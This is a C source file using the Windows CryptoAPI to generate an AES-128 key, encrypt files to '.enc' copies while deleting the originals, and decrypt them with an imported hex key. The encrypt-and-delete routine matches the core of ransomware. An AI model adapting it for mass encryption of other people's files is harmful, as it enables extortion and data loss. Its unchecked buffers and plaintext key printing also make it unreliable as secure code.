#include "crypto.h"

#include <stdio.h>
#include <string.h>

void InitializeSymmetricCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hKey, BYTE **keyBlob) {
    DWORD blobLen = 0;
    if (!CryptAcquireContext(hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) {
        printf("Error at CryptAcquireContext %d\n", GetLastError());
        return;
    }
    if (!CryptGenKey(*hProv, CALG_AES_128, CRYPT_EXPORTABLE, hKey)) {
        printf("Error at CryptGenKey: %d\n", GetLastError());
        CryptReleaseContext(*hProv, 0);
        return;
    }
    if (CryptExportKey(*hKey, 0, PLAINTEXTKEYBLOB, 0, NULL, &blobLen)) {
        *keyBlob = (BYTE*)malloc(blobLen);
    } else {
        printf("Error getting blob length: %d\n", GetLastError());
    }
    if (*keyBlob && CryptExportKey(*hKey, 0, PLAINTEXTKEYBLOB, 0, *keyBlob, &blobLen)) {
        printf("Export successful! Blob size: %ld bytes\nAES 128 key: ", blobLen);
        for (DWORD i = 12; i < blobLen; i++) {
            printf("%02x", (*keyBlob)[i]);
        }
        printf("\n");
    }
}

void FileEncrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    sprintf(newPath, "%s.enc", path);
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead = 0;
    BYTE iv[16];
    if (!CryptGenRandom(hProv, 16, iv)) {
        fclose(fptr);
        free(buffer);
        return;
    } else {
        fwrite(iv, 1, 16, fptr2);
    }
    BOOL final = FALSE;
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while ((bytesRead = fread(buffer, 1, chunkSize, fptr)) > 0) {
        if (feof(fptr)) final = TRUE;
        DWORD workingLen = bytesRead;
        if (CryptEncrypt(hKey, 0, final, 0, buffer, &workingLen, bufferSize)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

void HexToBytes(const char *hex, BYTE* bytes) {
    for (size_t i = 0; i < strlen(hex); i+=2) {
        sscanf(hex + i, "%02hhx", &bytes[i / 2]);
    }
}

HCRYPTKEY ImportKey(char *hexStr, HCRYPTPROV hProv) {
    BYTE hexRaw[16];
    HexToBytes(hexStr, hexRaw);

    #pragma pack(push, 1)
    struct {
        BLOBHEADER header;
        DWORD cbSize;
        BYTE keyData[16];
    } keyBlob;
    #pragma pack(pop)

    keyBlob.header.bType = PLAINTEXTKEYBLOB;
    keyBlob.header.bVersion = CUR_BLOB_VERSION;
    keyBlob.header.reserved = 0;
    keyBlob.header.aiKeyAlg = CALG_AES_128;
    keyBlob.cbSize = 16;
    memcpy(keyBlob.keyData, hexRaw, 16);

    HCRYPTKEY hKey = 0;
    if (!CryptImportKey(hProv, (BYTE*)&keyBlob, sizeof(keyBlob), 0, 0, &hKey)) {
        printf("Error importing key: %d\n", GetLastError());
        return 0;
    }
    return hKey;
}

void FileDecrypt(char *path, HCRYPTPROV hProv, HCRYPTKEY hKey) {
    FILE *fptr = fopen(path, "rb+");
    if (!fptr) return;
    unsigned char *newPath = (unsigned char*)malloc(260);
    size_t len = strlen(path);
    strncpy(newPath, path, len - 4);
    newPath[len - 4] = '\0';
    FILE *fptr2 = fopen(newPath, "wb");
    if (!fptr2) {
        free(newPath);
        fclose(fptr);
        return;
    }
    DWORD chunkSize = 1024*16;
    DWORD bufferSize = chunkSize + 16;
    BYTE *buffer = (BYTE*)malloc(bufferSize);
    DWORD bytesRead;
    BOOL final = FALSE;
    BYTE iv[16];
    fread(iv, 1, 16, fptr);
    DWORD dwMode = CRYPT_MODE_CBC;
    CryptSetKeyParam(hKey, KP_MODE, (BYTE*)&dwMode, 0);
    CryptSetKeyParam(hKey, KP_IV, iv, 0);
    while (1) {
        bytesRead = (DWORD)fread(buffer, 1, chunkSize, fptr);
        if (bytesRead < chunkSize) {
            final = TRUE;
        }
        DWORD workingLen = bytesRead;
        if (CryptDecrypt(hKey, 0, final, 0, buffer, &workingLen)) {
            fwrite(buffer, 1, workingLen, fptr2);
        }
        if (final) break;
    }
    free(buffer);
    free(newPath);
    fclose(fptr);
    fclose(fptr2);
    remove(path);
}

void FinalizeSymmetricCrypto(HCRYPTPROV *hProv, HCRYPTKEY *hKey, BYTE **keyBlob) {
    if (keyBlob && *keyBlob) {
        free(*keyBlob);
        *keyBlob = NULL;
    }
    if (hKey && *hKey) {
        CryptDestroyKey(*hKey);
        *hKey = 0;
    }
    if (hProv && *hProv) {
        CryptReleaseContext(*hProv, 0);
        *hProv = 0;
    }
}